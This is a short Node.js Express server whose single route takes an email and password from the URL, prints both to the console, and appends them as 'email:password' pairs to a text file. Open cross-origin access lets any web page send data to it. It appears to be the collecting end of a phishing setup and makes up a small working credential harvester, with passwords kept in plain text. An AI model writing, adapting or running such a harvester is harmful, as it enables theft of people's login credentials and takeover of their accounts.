const app = require('express')()
const fs = require('fs')
const append = (email, password) => new Promise((resolve) => {
  if (!fs.existsSync('data/pairs.txt')) {
    fs.writeFile('data/pairs.txt', `${email}:${password}`, resolve)
  } else {
    fs.appendFile('data/pairs.txt', `\n${email}:${password}`, resolve)
  }
})
app.get('/backend/:email/:password', async (req, res) => {
  console.log(`> Email: '${req.params.email}'`)
  console.log(`> Password: '${req.params.password}'`)
  await append(req.params.email, req.params.password)
  res.header('Access-Control-Allow-Origin', '*')
  res.end()
})
app.listen(3001, () => console.log('> Ready on port 3001'))